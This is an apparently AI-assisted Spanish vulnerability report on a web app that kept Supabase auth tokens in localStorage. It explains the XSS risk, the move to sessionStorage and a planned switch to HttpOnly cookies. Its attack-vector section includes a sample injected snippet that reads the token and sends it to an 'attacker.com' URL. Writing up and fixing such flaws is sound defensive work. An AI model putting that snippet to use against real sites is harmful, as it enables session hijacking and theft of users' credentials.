# V2: Token Storage Inseguro (localStorage) - Documentación Completa

## Identificación

**ID:** V2  
**Categoría:** Almacenamiento de Tokens / Client-Side Security  
**Severidad:** 🟠 **ALTA**  
**CVSS Score:** 7.1 (High)  
**Fecha detectada:** 25 de Marzo, 2026  
**Fecha mitigación:** 25 de Marzo, 2026

---

## Descripción Técnica

### Problema Identificado

Los tokens de autenticación de Supabase se almacenaban en `localStorage` del browser, haciéndolos vulnerables a ataques XSS (Cross-Site Scripting) y persistiendo más tiempo del necesario.

### Ubicaciones del Código Vulnerable

```javascript
// File: src/hooks/useVoiceInteraction.js
// Lines: 20-24

async function getSecureSessionToken() {
  try {
    // ANTES (VULNERABLE):
    const token = localStorage.getItem('supabase.auth.token');
    if (token) {
      const parsedToken = JSON.parse(token);
      return parsedToken.currentSession?.access_token || parsedToken.access_token;
    }
    // ...
  }
}
```

```javascript
// File: src/hooks/useAgentStates.js
// Lines: 74-87

// Helper to manage localStorage logs
const LOG_KEY = 'monica_office_logs';
function getPersistedLogs() {
  try {
    // ANTES (VULNERABLE):
    const saved = localStorage.getItem(LOG_KEY);
    return saved ? JSON.parse(saved) : [];
  } catch {
    return [];
  }
}
function persistLogs(logs) {
  try {
    localStorage.setItem(LOG_KEY, JSON.stringify(logs.slice(0, 50)));
  } catch { /* ignore storage errors */ }
}
```

---

## Impacto y Riesgos

### Vectores de Ataque

1. **XSS (Cross-Site Scripting)**
   ```javascript
   // Si un atacante inyecta este código:
   const token = localStorage.getItem('supabase.auth.token');
   fetch('https://attacker.com/steal?token=' + token);
   ```

2. **Persistencia Innecesaria**
   - localStorage persiste incluso después de cerrar el browser
   - Token disponible para otros sitios si el usuario copia el localStorage
   - No hay limpieza automática al cerrar sesión

3. **Session Hijacking**
   - Malware browser extensions pueden leer localStorage
   - Scripts de terceros (analytics, widgets) pueden acceder

4. **Physical Access**
   - Alguien con acceso físico a la computadora puede extraer tokens
   - DevTools → Application → LocalStorage

### Diferencias: localStorage vs sessionStorage vs Cookies

| Característica | localStorage ❌ | sessionStorage ⚠️ | HttpOnly Cookies ✅ |
|----------------|----------------|------------------|---------------------|
| Persistencia | Permanente (hasta limpieza manual) | Sesión de pestaña (se limpia al cerrar) | Sesión (configurable) |
| Accesible por JavaScript | ✅ Sí | ✅ Sí | ❌ No |
| Vulnerable a XSS | ✅ Sí | ✅ Sí | ❌ No |
| Enviado automáticamente | ❌ No | ❌ No | ✅ Sí (con requests) |
| Tamaño máximo | ~5-10 MB | ~5-10 MB | ~4 KB |
| Complejidad de implementación | Baja | Baja | Media |

---

## Mitigación Implementada

### Código Corregido

```javascript
// File: src/hooks/useVoiceInteraction.js
// Lines: 15-17

async function getSecureSessionToken() {
  try {
    // DESPUÉS (MEJORADO):
    // Usa sessionStorage en lugar de localStorage para mayor seguridad
    // Los datos se limpian al cerrar la pestaña/browser
    const token = sessionStorage.getItem('supabase.auth.token');
    if (token) {
      const parsedToken = JSON.parse(token);
      return parsedToken.currentSession?.access_token || parsedToken.access_token;
    }
    // ...
  }
}
```

```javascript
// File: src/hooks/useAgentStates.js
// Lines: 73-87

// Helper to manage sessionStorage logs (seguridad: se limpia al cerrar pestaña)
const LOG_KEY = 'monica_office_logs';
function getPersistedLogs() {
  try {
    // DESPUÉS (MEJORADO):
    const saved = sessionStorage.getItem(LOG_KEY);
    return saved ? JSON.parse(saved) : [];
  } catch {
    return [];
  }
}
function persistLogs(logs) {
  try {
    sessionStorage.setItem(LOG_KEY, JSON.stringify(logs.slice(0, 50)));
  } catch { /* ignore storage errors */ }
}
```

### Cambios Realizados

1. **Migración de localStorage → sessionStorage**
   - Tokens se limpian automáticamente al cerrar pestaña
   - Reduce ventana de exposición

2. **Mismo API, mejor seguridad**
   - sessionStorage tiene la misma interfaz que localStorage
   - No requiere cambios mayores en la lógica

3. **Documentación inline**
   - Comentarios explicando por qué se usa sessionStorage

---

## Arquitectura Recomendada (Futura Mejora)

Para máxima seguridad, el camino ideal es:

```
ACTUAL (Implementado hoy):
┌─────────────┐     ┌─────────────────┐
│  Supabase   │────▶│ sessionStorage  │
│   Auth      │     │ (JS accesible)  │
└─────────────┘     └─────────────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │  API Requests   │
                    └─────────────────┘

FUTURO (Recomendado post-entrega):
┌─────────────┐     ┌─────────────────┐
│  Supabase   │────▶│  HttpOnly Cookie│
│   Auth      │     │ (No JS access)  │
└─────────────┘     └─────────────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │  Browser envía  │
                    │  automáticamente│
                    └─────────────────┘
```

### Implementación con Cookies HttpOnly (Roadmap)

```typescript
// Configuración recomendada para producción futura
const cookieOptions = {
  httpOnly: true,      // No accesible por JavaScript
  secure: true,        // Solo HTTPS
  sameSite: 'strict',  // Previene CSRF
  maxAge: 3600,        // 1 hora
  path: '/'
};

// El token se maneja completamente server-side
// Frontend no tiene acceso directo al token
```

---

## Guía de Implementación

### Cambio Actual (sessionStorage)

El cambio ya está implementado. No se requieren acciones adicionales.

### Para Implementación Futura (HttpOnly Cookies)

```bash
# 1. Configurar Supabase Auth para cookies
npm install @supabase/ssr

# 2. Crear middleware de autenticación
# Ver: https://supabase.com/docs/guides/auth/server-side/creating-a-client

# 3. Actualizar hooks para usar cookies
# En lugar de sessionStorage.getItem(), usar cookies
```

---

## Verificación de Mitigación

### Checklist de Verificación

- [ ] No hay llamadas a `localStorage.getItem('supabase.auth.token')`
- [ ] No hay llamadas a `localStorage.setItem('supabase.auth.token')`
- [ ] Todo token storage usa `sessionStorage`
- [ ] Logs también migrados a sessionStorage
- [ ] Funcionalidad verificada (login/logout funciona)
- [ ] Tokens se limpian al cerrar pestaña

### Comandos de Verificación

```bash
# Buscar uso de localStorage en el proyecto
grep -r "localStorage" src/

# Debe retornar vacío o solo comentarios/documentación

# Verificar que sessionStorage se usa
grep -r "sessionStorage" src/

# Debe mostrar los archivos modificados
```

### Test Manual

1. Iniciar sesión en la aplicación
2. Verificar en DevTools → Application → Session Storage que existe el token
3. Cerrar la pestaña del browser
4. Reabrir la aplicación
5. Verificar que el token se limpió (requiere nuevo login)

---

## Lecciones Aprendidas

### Anti-Patrones Evitados

1. ❌ **Nunca almacenar tokens en localStorage**
   ```javascript
   // MAL:
   localStorage.setItem('token', jwtToken);
   ```

2. ✅ **Preferir sessionStorage para datos temporales**
   ```javascript
   // MEJOR:
   sessionStorage.setItem('token', jwtToken);
   ```

3. ✅ **Ideal: HttpOnly cookies para producción**
   ```javascript
   // ÓPTIMO (para implementar después):
   // Token en cookie httpOnly, no accessible por JS
   ```

### Contexto de Decisión

**Por qué sessionStorage y no HttpOnly cookies ahora:**

| Factor | Decisión |
|--------|----------|
| Tiempo disponible | sessionStorage es cambio rápido (mismo API) |
| Riesgo de breaking changes | sessionStorage es drop-in replacement |
| Complejidad | Cookies requieren backend changes significativos |
| Ventana de exposición | sessionStorage reduce riesgo inmediato |
| Roadmap | HttpOnly cookies planeado para post-entrega |

---

## Referencias

- [OWASP: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [Supabase: Auth Best Practices](https://supabase.com/docs/guides/auth/quickstart)
- [OWASP: Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

## Historial de Cambios

| Fecha | Autor | Cambio |
|-------|-------|--------|
| 2026-03-25 | Cascade AI | Migración de localStorage a sessionStorage implementada |

---

*Documentación generada para: CRM AI Office Virtual Agent*  
*Propietario: Equipo de Seguridad UAL*
